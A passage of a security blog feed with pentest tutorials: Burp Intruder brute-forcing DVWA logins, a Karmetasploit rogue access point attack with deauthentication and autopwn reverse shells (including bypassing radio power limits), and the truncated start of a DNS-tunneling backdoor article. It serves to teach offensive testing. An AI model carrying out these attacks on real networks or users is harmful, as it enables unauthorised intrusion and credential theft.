&lt;p&gt;Now go to the options tab and check to see if the proxy is listening on port 8080. Also make sure “Generate CA-signed per-host certificates” option is checked. Each time the user connects to a SSL protected website, Burpsuite will generate a server certificate for that host, signed by a unique CA certificate which is generated in Burpsuite during it’s installation. The purpose of this is to reduce the SSL errors that occur because of the proxy in between.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now that we have set up Burpsuite and the configurations in our browser properly, we can intercept requests. Please note that whenever you send a request, it will be intercepted by Burpsuite and you will have to forward it manually. Hence it is advisable to keep “intercept is on” option checked only when you really want to see the contents of the packets going through.&lt;/p&gt;

&lt;h2 id=&quot;types-of-authentication&quot;&gt;Types of Authentication&lt;/h2&gt;

&lt;h3 id=&quot;1http-basic-authentication&quot;&gt;1)HTTP-Basic Authentication&lt;/h3&gt;

&lt;p&gt;HTTP-Basic authentication uses a combination of a username and password to authenticate the user. The process starts when a user sends a GET request for a resource without providing any authentication credentials. The request is intercepted by Burpsuite and looks something like this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The server responds back with a “Authorization Required” message in it’s header.We can see the packet in Wireshark. As we can see from the header that the authentication is of the type “Basic”. The browser is quick to recognize this and displays a popup to the user requesting for a Username and a Password. Note that the popup is displayed by the browser and not the web application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we type in the username and password and intercept the request the request again using Burpsuite, we get something like this.The last line says “Authorization: Basic aW5mb3NlYzppbmZvc2VjaW5zdGl0dXRl”. This is basically the extra thing being passed in the header now. The text after Basic holds the key. These are basically the credentials in encoded form.The username and password are concatenated with a colon (:) in between and the whole thing is then encoded using the Base64 algorithm. For example, if the username is “infosec” and the password is “infosecinstitute” then the whole thing “infosec:infosecinstitute” is encoded using the Base 64 algorithm.The server then gets the header value, decodes it to get the credentials and grants access to the user if the credentials are correct. The point to note here is that it is very trivial to decode the encoded string to obtain the credentials, hence it is widely vulnerable to eavesdropping attacks.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Wireshark is able to recognize this and automatically decodes the string to reveal the credentials as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see from the Credentials sections, the username and password are “infosec” and “infosecinstitute” respectively. One of the problems with HTTP-Basic Authentication is that the data is being passed over in plaintext. This risk can be removed by using SSL, which will send the data in encrypted format, and hence the value in the Authorization header will not be visible. However it will be still be vulnerable to many client side attacks, including MITM. It is also vulnerable to Brute force attacks which we will see in the coming sections.&lt;/p&gt;

&lt;h3 id=&quot;2http-digest-authentication&quot;&gt;2)HTTP-Digest Authentication&lt;/h3&gt;

&lt;p&gt;Digest Authentication was designed as an improvement over Basic Authentication. One of the major improvements with it is that the data is not passed over in cleartext but in encrypted format. The user first makes a request to the Page without any credentials. The server replies back with a WWW-Authenticate header indicating that credentials are required to access the resource. The server also sends back a random value which is usually called a “nonce”. The browser then uses a cryptographic function to create a message digest of the username, password, nonce, the HTTP methods, and the URL of the page. The cryptographic function used in this case is a one way function, meaning that the message digest can be created in one direction but cannot be reversed back to reveal the values that created it.By default, Digest authentication uses MD5 cryptographic hashing algorithm.&lt;/p&gt;

&lt;p&gt;Digest Access authentication is less vulnerable to Eavesdropping attacks than Basic authentication, but is still vulnerable to replay attacks, i.e if a client can replay the message digest created by the encryption, the server will allow access to the client. However to thwart this kind of attack, server nonce sometimes also contains timestamps. Once the server gets back the nonce, it checks its attributes and if the time duration is exceeded, it may reject the request from the client. One of the other good things about Digest access authentication is that the attacker will have to know all the other 4 values (username, nonce, url, http method) in order to carry out a Dictionary or a Brute force attack. This process is more computationally expensive than simple brute force attacks and also has a larger keyspace which makes brute force attack less likely to succeed.&lt;/p&gt;

&lt;h3 id=&quot;3form-based-authentication&quot;&gt;3)Form Based Authentication&lt;/h3&gt;

&lt;p&gt;Form Based Authentication uses a form (usually in html) with input tags to allow users to enter their username and password. Once the user submits the information, it is passed over through either GET or POST methods via HTTP or HTTPs to the server. On the server side if the credentials are found to be correct, then the user is authenticated and some random token value or session id is given to the user for subsequent requests. One of the good features about Form Based authentication is that their is no standardized way of encoding or encrypting the username/password, and hence it is highly customizable which makes it immune to the common attacks which were successful against HTML Basic and Digest Authentication mechanisms. Form Based authentication is by far the most popular authentication method used in Web applications. Some of the issues with Form based authentication is that credentials are passed over in plaintext unless steps such as employment of TLS (Transport Layer Security) are not taken.&lt;/p&gt;

&lt;p&gt;Let’s see an example of Form based authentication. We will be using DVWA (Damn vulnerable web application) for our exercise as we will be using the same for carrying out a brute force attack against Form based authentication. DVWA can be downloaded from &lt;a href=&quot;http://dvwa.co.uk/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Once you have downloaded and installed it, login with the default credentials {admin/password} and click on the Brute Force tab on left side and click on View Source to view the source. Please note that the Security level is set to high in my case. As we can see the form accepts the username and password, validates it to remove any sort of special characters which could be used to perform SQL injection, and then sends it over to a sql query where the credentials are checked against the database to see if they are correct or not.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;let’s input any username/password and intercept the result using Burpsuite. Here is what it should look like in your case.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;attacking-web-authentication&quot;&gt;Attacking Web Authentication&lt;/h2&gt;

&lt;p&gt;In this section we will be carrying out a bruteforce attack against form based authentication for Security level “High” in Dvwa. Please note that brute force attacks may not work in all cases. In some cases websites will start rejecting your requests after some specified number of unsuccessful tries. Also some websites may use CAPTCHA to validate if a human is indeed making the request or not.&lt;/p&gt;

&lt;p&gt;To carry out a brute force attack, we will be using the intruder feature in Burpsuite. Some of the things required for this attack are a list of common usernames and passwords. Go to the form and submit a request using any username/password for now, then intercept the request. Once you have the request, right click on it and click on “send to intruder”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This will send the request information to the intruder. Go to the intruder tab. Now we will have to configure burpsuite to launch the brute force attack.Under the target tab, we can see that it has already set the target by looking at the request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Go to the positions tab now, here we can see the request which we had previously sent to intruder. Some of the things are highlighted in the request. This is basically a guess by Burpsuite to figure out what all things will be changing with each request in a Brute force attack. Since in this case only username and password will be changing with each request, we need to configure Burp accordingly.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Click on the clear button on the right hand side. This will remove all the highlighted text, now we need to configure Burp to only set the username and password as the parameters for this attack. Highlight the username from this request (in this case “infosec”) and click on Add. Similarly highlight the password from this request and click on Add. This will add the username and password as the first and second parameters. Once you are done, your output should look something like this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next thing we need to do is set the Attack type for this attack, which is found at the top of the request we just modified. By default it is set to Sniper. However in our case we will be using the Attack type “Cluster Bomb”. For more details on which attack is suitable for which scenario, please read Burp’s documentation. Basically the idea of cluster bomb is to use Multiple payload sets (1 for username and 1 for the password), the attack will start by trying all the values in Payload 1 with first value in Payload 2, then by trying all the values in Payload 1 with second value in Payload 2 and so on. As we can see from the image below, our attack type is set to “Cluster Bomb”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Go to the payload tab, make sure payload set 1 is selected, click on load and load the file containing a list of usernames. In my case i am using a very small file just for demonstrations purposes. Once you load the file all the usernames will be displayed as shown in the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Similarly select payload set 2, click on load and load the file containing a list of passwords.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Go to the options tab now and make sure “store requests” and “store response” options are set under results. Have a look at all the options and see if you need or don’t need any of these options.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;All right we are now set to launch our attack. Click on intruder on the top left and click on “start attack”. We will see a windows pop up with all the requests being made. So how do we know which request is successful. Usually a successful request will have a different response than an unsuccessful request or will have a different status response. In this case we see that the request with the username “admin” and the password “password” has a response of different length than the other responses.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s click on the request with a different length response. If we click on the response section, we see the text “Welcome to the password protected area admin” in the response. This confirms that the username/password used in this request is the correct one.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/webauth1//19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this article we discussed some of the common authentication methods used, the vulnerabilities in these authentication methods and then looked at different ways to attack them. However this is just a part of the story. In the recent years, many other authentication mechanisms have been developed, including use of “One Time passwords”, “Digital Certificates” and use of external authentication service providers like Open ID. Several other attacks which have not been discussed in this article are Session Stealing, Cookie stealing, Cross Site Request Forgery and SQL Injection. We will be discussing all these in the next article.&lt;/p&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>KARMETASPLOIT</title>
   <link href="https://bitbrain.github.io/2013/06/12/karmetasploit.html"/>
   <updated>2013-06-12T04:49:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/12/karmetasploit</id>
   <content type="html">&lt;p&gt;Wireless networks have become very common in today’s world, people are used to be connected to wireless networks in office, home, coffee shops etc. In order to facilitate the process of connecting to the wireless network, most of the operating systems often remember the previous networks connected to (often stored in Preferred Networks List) and send continuous probes looking for these networks. Once the network is found, the system automatically connects to the network. If more than one of the probed networks is found, it connects to the network with the highest signal strength (though it may vary sometimes on the operating system used).Since these clients send continuous probes, any hacker within the radio frequency range can listen passively and see the networks the client is probing for. Because of the vulnerabilities in the implementation of the algorithms for connecting to previous networks, it is possible for an attacker to set up a custom station (Access point) and have the victim connect to it. Once the victim is connected to the Fake AP the attacker has IP-level connectivity to the victim and can launch a bunch of attacks against the victim.&lt;/p&gt;

&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;

&lt;p&gt;Dino Dai Zovi ann Shane Macaulay, 2 security researchers, wrote a set of wireless security tools developed as a Proof of concept for this vulnerability and called it Karma. It was later integrated with Metasploit and called Karmetasploit, so when a victim connects to the fake AP, karmetasploit launches all the suitable attacks available in the Metasploit framework against the vicitm. Karmetasploit also implements various evil services like DNS, POP3, FTP, SMB etc and responds to the client’s requests for these services. That way, we can also capture passwords and other credentials. In this article we will look at a demo of Karmetasploit in action.&lt;/p&gt;

&lt;h2 id=&quot;configuration&quot;&gt;Configuration&lt;/h2&gt;

&lt;p&gt;The first thing is to download the Karma resource file from Offensive security website as shown in the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next step is to set up a DHCP server in place. This is because clients will expect an IP-address to be handed over to them when they connect to the access point. We will need to install the dhcp3-server utility, and also specify a custom configuration file. Set up the configuration file as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//2 actual.png&quot; alt=&quot;2 Actual&quot; /&gt;&lt;/p&gt;

&lt;p&gt;a) At the start of the configuration file is the place for setting your global parameters, as we can see the domain name server address has been set to 10.0.0.1. Some things to note about the settings is that some lines start with the option keyword whereas some do not. The lines that start with the “option” keyword correspond to the options for the DHCP server, whereas the lines that do not start with the option keyword can either control the behaviour of the DHCP server, or specify some client parameters that are not optional in the DHCP protocol.&lt;/p&gt;

&lt;p&gt;b) In the second and third line we have set up the default and the maximum lease time, this actually specifies the time after which the DHCP server will reclaim and reallocate the IP addresses. Usually the lease renews itself halfway through the set time. For e.g if the lease time is set to 2 hours, the lease will renew itself after every 1 hour. In this case the default and the maximum lease time has been set to 1 minute and 1.2 minutes respectively.&lt;/p&gt;

&lt;p&gt;c) The fourth line states “ddns-update-style none;”, this basically specifies the dynamic dns update style to be used. In this case we have set it to none.&lt;/p&gt;

&lt;p&gt;d) In the fifth line the term “authoritative” means that the DHCP server is the official DHCP server for the local network. Obviously we should set it to authoritative to avoid any sort of suspicion.&lt;/p&gt;

&lt;p&gt;e) The sixth statement “log-facility local7” specifies the DHCP server to do all its logging on the specified log facility (in this case local7). There are a number of log facilities available but not all log facilities are available on all systems. Some of the popular log facilities include auth, daemon, security, syslog etc.&lt;/p&gt;

&lt;p&gt;f) In the next line the configuration for an internal subnet is set inside curly braces, this means that the options inside the braces specify only to the systems with subnet 10.0.0.1 and netmask 255.255.255.0 .The range parameter specifies the range in which the IP-Addresses will be handed over to the client. In this case the clients connected to the Fake AP will be assigned the IP-addresses in the range 10.0.0.25-10.0.0.254. We have also set up the domain name server’s and the router’s IP-address inside the curly braces.&lt;/p&gt;

&lt;p&gt;Let’s have a quick look at the karma resource file, type “cat karma.rc” to show the contents of the file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//3 actual.png&quot; alt=&quot;3 Actual&quot; /&gt; &lt;img src=&quot;/images/posts/Karmetasploit//4 actual.png&quot; alt=&quot;4 Actual&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First of all it loads the database “db_connect postgres:toor@127.0.0.1/msfbook” and then loads the browswer_autopwn server, the browser_autopwn is useful in launching a number of browser based exploits against the client as soon as the client opens up the browser. It then sets the server’s IP, port and the URL. After that, a number of servers are started on different ports. One of the notable ones is the fakedns server which listens on UDP port 53 (which is used by default for handling DNS requests), receives the requests from the clients for different domain names and hands out an incorrect IP-address for that domain.&lt;/p&gt;

&lt;h2 id=&quot;launching-the-attack&quot;&gt;Launching the Attack&lt;/h2&gt;

&lt;p&gt;Now it’s time to set up the Fake-AP, we need a good wireless card for that, i am using “Alfa AWUS036H” 1000mW USB Wireless WiFi Adapter, it’s a very popular wireless card and supports packet injection. One of the other cool things about it is that Backtrack already has drivers installed for this card and hence we don’t need to do any custom setup or installation. Just plug it in and it will work. We will start by setting our wireless card in monitor mode, which allows us to sniff all the packets in our RF range, hence we can see what networks the clients nearby are probing for. Type in the “iwconfig” command to see the wireless interface. Type in “airmon-ng start interface-name” to set up the card in monitor mode.As we can see a virtual interface named mon0 has been created on top of wlan0 interface and it is currently in monitor mode.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s do a simple hack now to increase the signal strength of our wireless card. This is because we want the nearby clients to connect to us and hence our card should provide good signal strength which will increase the chances of clients connecting to us. Different countries have different range of power levels under which the wireless card will have to operate, for e.g in my case (INDIA), the maximum allowed strength for a wireless card is 20 DBm (approximately 100mW), however my card supports upto 30 DBm (1000 mW). The command “iw reg set IN” sets the regulatory domain to India (IN).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Linux however allows us to change the regulatory domain, and hence we can bypass the regulatory restriction. But which country should we change the regulatory domain to? One of the answers is “Bolivia”, as it allows our card to operate at the maximum power level i.e 30 DBm. Type in the commands as shown in the figure below to set the transmission power to 30DBm&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see the tx-power is now set to 30 DBm.&lt;/p&gt;

&lt;p&gt;We will now set up our Fake AP. We will use the utility airbase-ng which is available by default in Backtrack. Type in the following command as shown in the figure below to set up the Fake AP. The name of the AP is set by the -e option, the -P option asks airbase-ng to respond to all probes, the “-C 30” option asks airbase-ng to send Beacon frames with the ESSID of all the probed networks after every 30 seconds, so that a client in the RF range probing for the same network will be fooled and will connect to the Fake AP set up by the attacker if we are able to provide a better signal strength than the actual network. Finally we specify the interface name which is mon0.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can also see that airbase-ng has created a virtual interface named “at0”. This interface will be used by Karmetasploit.&lt;/p&gt;

&lt;p&gt;We can verify from airodump-ng that a network named “InfoSecInstitute” has been created, also in the lower section under the probes section we can also see that some clients are probing for networks and the name of the network is given under the Probes section. Type in the command “airodump-ng mon0” to see a similar output, where mon0 is the interface which is currently set up in monitor mode.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next step is to set up the DHCP server. First install the dhcp3-server by using the following command as shown below, as you can see i already have the latest version. Also don’t forget to backup the original dhcpd.conf file when creating a new one for our DHCP server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we are going to start up the DHCP server, first we assign an IP-address and a netmask to the at0 interface and set it up. Next we start the DHCP server by typing the command as shown in the figure below. As we can see from the command that we are passing our previously created dhcpd.conf file as an input.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;To verify that the DHCP server is running, let’s do a quick “ps aux&lt;/td&gt;
      &lt;td&gt;grep dhcpd “ and check the output. As we can see the dhcpd service is up and running.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also it would be a good idea to see the messages log file to see the IP addresses being handed out when the DHCP server is responding to our clients. It is also evident from the output that the dhcpd3 service is listening for requests.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now it’s time to start up Karmetasploit, go to the terminal and type in “msfconsole -r karma.rc”. We can see that the karma resource file is being given as an input to Metasploit. You will get a somewhat similar output as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this image, Karmetasploit is creating different tables to store various info about the client like credentials, email address etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this image, Karmetasploit is setting LHOST to 10.0.0.1, and setting other options like Server Port (SRVPORT) , path of the url (URIPATH) etc. It is also starting up services like POP3 , Ftp .&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here it is loading all the autopwn exploits, and setting up their corresponding payloads. Most of these payloads are reverse payloads, which can also work if the victim is behind a NAT, as the connection is made being from the client to the attacker and not from the attacker to the client.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, a payload handler is started by Karmetasploit, and it starts listening for connections from the client. If all goes well, you will get a “Server started” message in the end.&lt;/p&gt;

&lt;p&gt;It’s now time for the client to connect to our Fake Access point, we can wait for some time for the client to connect or we can simply carry out a deauthentication attack against the client. After being deauthenticated from the network the client will again try to reconnect to the network, however if our signal strength is more, it will connect to our Fake AP as our Fake AP will be the first to respond to their probes. The figure below shows how to carry out a broadcast deauthentication attack. Note that it is essential to first put your card on the same channel as the access point. This attack will basically tell all the clients associated with the Access point to disconnect from it. Hence we have to give the bssid of the access point using the “-a” option which we can find easily using Airodump.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the client connects to us, an IP-address will be handed over to it from our DHCP server, we can find this out by looking at the logs file, as we can see, a number of IP-addresses are being handed over to clients that connect to our Fake AP.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also in the Airbase-ng output we can also see that some clients have connected to us.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When the use opens up his browser, all he sees is this page showing the Loading sign, this page however can be modified by the hacker to make a custom web page as the html file is present in the Metasploit directory. In this case i connected 2 systems running Mac OS and Windows 7 respectively.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//21.png&quot; alt=&quot;21&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the background however, a lot of action is happening as is evident from the karmetasploit output below. We can see two Javascript reports in the output. Karma has identified the operating systems running on these systems as well as the browser and their versions. Based on that it has identified some exploits and is starting to drop the payloads on the systems. In this case i am using fully patched Mac OS and Windows 7 systems, hence it is not able to get a shell on the system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//22.png&quot; alt=&quot;22&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The results are different when working with an unpatched windows box, we get a meterpreter session on the system, also note that we must migrate to another process as soon as we get a shell because the user may close the browser and hence our connectivity may be lost.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Karmetasploit//23.png&quot; alt=&quot;23&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Wireless networks have become very common these days, however due to the vulnerabilities in the algorithms used to connect to a wireless network, an attacker can force a client to connect to a Fake AP after which the attacker will have IP-level connectivity to the client and can launch a bunch of exploits against it. Karma was developed as a POC for this vulnerability and later integrated with the Metasploit framework and called Karmetasploit. Karmetasploit uses the vulnerability in the 802.11 protocols and the exploits present in metasploit framework to carry out a directed attack at the victim. One of the good features about this kind of attack is that it will even work against secured wireless networks.&lt;/p&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Abusing IP Protocols to Create Covert Channels when Penetration Testing</title>
   <link href="https://bitbrain.github.io/2013/06/12/abusing-ip-protocols-to-create-covert-channels-when-penetration-testing.html"/>
   <updated>2013-06-12T04:18:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/12/abusing-ip-protocols-to-create-covert-channels-when-penetration-testing</id>
   <content type="html">&lt;p&gt;This article will talk about the maintaining access step in a penetration test. After an attacker has broken into the system and got access, escalated privileges etc, it is important for him to maintain his authority on the system so that he can access it at a later time. The exploited system could be a web server (directly accessible from the internet), or a system running inside a network with NAT, hence not directly accessible from the internet. The system could also be running in a network with a firewall that monitors incoming and outgoing packets, having filters set for different types of packets, protocols etc. There could be a number of different scenarios, and it is important from the attacker’s perspective to maintain his access on the compromised host. In this article we will discuss all these cases, take up different real world scenarios and see all the different methods of bypassing those restrictions. So let’s begin!&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;As discussed previously the compromised system could be a web server directly accessible from the internet. In this scenario the attacker could install a web backdoor or a webshell on the system. The backdoor could be any type of file (php,jsp etc) which could be accessed from the internet. On accessing it through the browser the attacker can run commands on the compromised system through the interface provided by the file, browse files and directories etc. Or it could just be a malicious program which opens a port on the victim machine and allows access to the hacker from the outside. In some cases the victim machine could be running a firewall that monitors incoming and outgoing packets. For e.g. the firewall may not allow outgoing TCP connections from the compromised host, but allow other generic protocols like DNS (it is mandatory on most networks) and ICMP. The attacker could then use a technique called TUNNELING. Tunneling is the process of encapsulating one protocol into another protocol. The protocol which is encapsulated is called the payload protocol and the protocol which encapsulates this protocol is called the delivery protocol. Tunneling can be used for bypassing firewall restrictions and can even be used for providing a secure path over untrusted networks. They are also used for bypassing hotspot access controls.For e.g. one can encapsulate FTP traffic (which is plain text and can be seen by an eavesdropper) onto the HTTPS protocol, thereby making it unobservable to the listener. TCP protocol can also be encapsulated into DNS or ICMP protocol, thereby bypassing the firewall restrictions. Hence the techniques used in the maintaining access step of a penetration test can broadly be classified into three tags.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Protocol Tunneling&lt;/li&gt;
  &lt;li&gt;Web Backdoors&lt;/li&gt;
  &lt;li&gt;OS Backdoors&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In this article we will be discussing each of them in detail.&lt;/p&gt;

&lt;p&gt;1)&lt;strong&gt;Protocol Tunneling&lt;/strong&gt;- Protocol Tunneling is the process of encapsulating one protocol into another protocol .We will cover 2 types of Tunneling in this section.&lt;/p&gt;

&lt;h2 id=&quot;adns-tunneling&quot;&gt;a)DNS Tunneling&lt;/h2&gt;

&lt;p&gt;In this exercise we will use Iodine (available by default in Backtrack 5) to encapsulate IPv4 traffic into DNS Traffic .But first let’s understand how DNS Tunneling works.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//DNS-Tunneling.png&quot; alt=&quot;DNS Tunneling&quot; /&gt;&lt;/p&gt;

&lt;p&gt;1) The client (in this case our victim) uses a program (in this case Iodine) to encapsulate Ipv4 traffic into DNS traffic and sends the entire traffic to a subdomain (for e.g tunnel.example.com) controlled by us. Let’s say the client(or victim) had tried to contact our control machine, through which we control the victim. Note that the control machine and the subdomain to which traffic is being sent are entirely different. The client sends the traffic to the control machine through our subdomain. Also, it is important to note that the subdomain should be running a DNS server.&lt;/p&gt;

&lt;p&gt;2) After the traffic has reached tunnel.example.com, the iodine program running on our server will convert it into normal traffic and forward it to the queried domain (the control machine).&lt;/p&gt;

&lt;p&gt;3) Once the iodine server gets a response back, it again encapsulates the normal traffic into DNS and sends it through the tunnel.The DNS traffic is allowed by the firewall and is able to reach the client. In this way, we are able to communicate with the victim machine.&lt;/p&gt;

&lt;h2 id=&quot;lab-setup&quot;&gt;LAB SETUP&lt;/h2&gt;

&lt;p&gt;We will need a client running iodine (which in our case will be the victim , and will be one end of the tunnel), and a server running iodined (which will be the other end of the tunnel). The traffic between the client and server will appear to be DNS traffic (thereby bypassing restrictions set by the firewall), as we will see soon. Since Iodine comes preinstalled with Backtrack 5, we will be using 2 Backtrack 5 machines as our client and server. In this case we will be testing the DNS tunnel on a LAN.&lt;/p&gt;

&lt;p&gt;The first step is to check if DNS traffic is actually allowed to pass through or not. For this just go to the terminal and try pinging any domain from the victim machine. If we get an IP-address in the reply section, then it means that DNS packets are allowed, because the query went to the DNS server and it returned back the IP-Address of the domain.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/Maintaining-Access//ping.png&quot; alt=&quot;Ping&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok Cool , so DNS packets are allowed on the network. The next step is to start the Iodine server on our server machine. Note that this machine acts as an intermediate between the victim and the control machine. The traffic is encapsulated onto DNS only between between the victim and the intermediate machine. For e.g let’s say the victim is set to send requests to tunnel.infosecinstitute.com . The query will first reach the infosecinstitute.com server. If it has a A record for tunnel.infosecinstitute.com , the request will reach the tunnel.infosecinstitute.com server. Note that in order to direct the request for tunnel.infosecinstitute.com to your server, we should have an NS record in the zone file of infosecinstitute.com server. This server is the one running the Iodine program. This DNS server will then forward our requests to whichever domain we had queried for, get the response back, encapsulate it into DNS and then send the response back to the victim.&lt;/p&gt;

&lt;p&gt;Type in the following command to start Iodine server&lt;/p&gt;

